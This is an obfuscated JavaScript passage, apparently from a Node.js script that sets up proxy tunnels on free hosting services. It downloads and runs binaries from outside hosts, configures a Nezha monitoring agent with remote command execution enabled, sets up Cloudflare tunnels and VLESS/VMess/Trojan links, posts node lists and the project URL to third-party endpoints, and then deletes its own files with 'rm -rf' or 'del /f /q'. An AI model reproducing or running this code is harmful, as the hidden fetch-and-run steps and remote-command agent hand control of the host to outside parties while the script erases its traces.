_0x2624f3={_0x29391c:0x101,_0x3bfcb2:0xc4},_0x4072d3=_0x3331,_0x264fb0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x264fb0[_0x4072d3(_0x555e84._0xd31c3a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x264fb0[_0x4072d3(_0x555e84._0x237988)](phpPath);process[_0x4072d3(0xcf)]==='win32'?exec(_0x4072d3(_0x555e84._0x1c8693)+_0x264fb0[_0x4072d3(0x116)]('\x20')+_0x4072d3(0xbd),_0x5ace1c=>{const _0x55fe62=_0x4072d3;console['clear'](),console[_0x55fe62(0x101)]('App\x20is\x20running'),console[_0x55fe62(_0x43f032._0x32b259)](_0x55fe62(0xc4));}):exec('rm\x20-rf\x20'+_0x264fb0[_0x4072d3(0x116)]('\x20')+_0x4072d3(0x143),_0xe073b2=>{const _0x55c58c=_0x4072d3;console[_0x55c58c(0x8a)](),console['log'](_0x55c58c(0x114)),console[_0x55c58c(_0x2624f3._0x29391c)](_0x55c58c(_0x2624f3._0x3bfcb2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f8247={_0x5eedce:0x101,_0x2d65b9:0x8d,_0x2501da:0xc8,_0x30b98c:0x118,_0x9764e9:0x13c,_0x35fb9a:0xe9},_0x2f0372=_0x4f7718;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f0372(_0x2f8247._0x5eedce)](_0x2f0372(0xc7));return;}try{const _0x440cbf=await axios[_0x2f0372(_0x2f8247._0x2d65b9)](_0x2f0372(_0x2f8247._0x2501da),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f0372(_0x2f8247._0x30b98c)}});return console[_0x2f0372(0x101)](_0x2f0372(0x133)),_0x440cbf;}catch(_0x499977){return console[_0x2f0372(_0x2f8247._0x9764e9)](_0x2f0372(_0x2f8247._0x35fb9a)+_0x499977['message']),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x222805){console['error']('Error\x20in\x20startserver:',_0x222805);}}startserver()[_0x4f7718(0xe5)](_0x4017b5=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x4017b5);}),app[_0x4f7718(0x144)](PORT,()=>console[_0x4f7718(0x101)](_0x4f7718(0xf4)+PORT+'!'));function _0x4da9(){const _0x23b734=['false','base64','quic','npm\x20running\x20error:\x20','win32','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0avless://','3266136htqpKd','App\x20is\x20running','data','join','\x0a\x20\x20credentials-file:\x20','application/json','boot.log','NEZHA_PORT','2083','stringify','Error\x20executing\x20command:\x20','arch','utf-8','vless','success','.exe\x20>\x20nul\x202>&1','sub.txt','/tunnel.yml\x20run','TunnelSecret','?encryption=none&security=tls&sni=','\x0aclient_secret:\x20','unshift','CFIP','Unknown','https://amd64.ssss.nyc.mn/bot','http://ip-api.com/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','set','unlink','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','path','filter','automatic\x20access\x20task\x20added\x20successfully','209FoAVNG','NEZHA_KEY','443','Empowerment\x20success\x20for\x20','blackhole','&fp=firefox&type=ws&host=','koyeb','tls','error','\x20is\x20running','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','response','/dev/null','list.txt','Empowerment\x20failed\x20for\x20','\x20>/dev/null\x202>&1','listen','has','charAt','floor','/vmess-argo?ed=2560','send','tunnel.json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/config.json\x20>/dev/null\x202>&1\x20&','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','freedom','random','Hello\x20world!','from','clear','length','mkdirSync','post','basename','includes','1444otgotQ','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','470988dbHneJ','\x20-p\x20','https://amd64.ssss.nyc.mn/v1','Error\x20downloading\x20files:','org','/api/add-subscriptions','/vmess-argo','then','config.yaml','2568155qRjAXp','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','direct','12249288ZejODi','https://arm64.ssss.nyc.mn/web','test','trojan','substring','https://arm64.ssss.nyc.mn/bot','writeFileSync','\x20-c\x20','del\x20/f\x20/q\x20','stream','ARGO_DOMAIN','6vGdeFO','get','forEach','status','statSync','/vless-argo','ARGO_AUTH','existsSync','createWriteStream','2053','none','https+local://8.8.8.8/dns-query','koyeb.xmb.de5.net','fileName','countryCode','arm','8443','tcp','9afd1229-b893-40c1-84dd-51e7ce204913','readFileSync','\x20>\x20nul\x202>&1','/trojan-argo','https://ipapi.co/json/','/sub.txt\x20saved\x20successfully','true','10lzhfCl','32984eQoGpb','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','exec','country_code','Skipping\x20adding\x20automatic\x20access\x20task','https://oooo.serv00.net/add-url','fileUrl','Content-Type','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/web','child_process','split','platform','51738bwcTzT','env','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','\x20-c\x20\x22','util','php\x20running\x20error:\x20','2096','&path=%2Ftrojan-argo%3Fed%3D2560#','unlinkSync','\x0a\x0avmess://','ARGO_DOMAIN:','web\x20running\x20error:\x20','127.0.0.1','\x20already\x20exists','sub','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','./tmp','Download\x20','axios','ngnix.hndz.qzz.io:80','catch','abcdefghijklmnopqrstuvwxyz','\x20is\x20created','https://amd64.ssss.nyc.mn/agent','Add\x20automatic\x20access\x20task\x20faild:\x20','map','/api/delete-nodes','\x20successfully','vmess','config.json','match','2087','aarch64','push','readdirSync','http\x20server\x20is\x20running\x20on\x20port:','close','tunnel.yml','pkill\x20-f\x20\x22[','nohup\x20','\x0a\x0atrojan://','\x0a\x20\x20\x20\x20','cdns.doon.eu.org','\x20failed:\x20','https://arm64.ssss.nyc.mn/v1','isFile','11KjICSw','arm64','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Nodes\x20uploaded\x20successfully','180MXfbjo','PORT','\x20>/dev/null\x202>&1\x20&','toString','http','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','message','PROJECT_URL'];_0x4da9=function(){return _0x23b734;};return _0x4da9();}
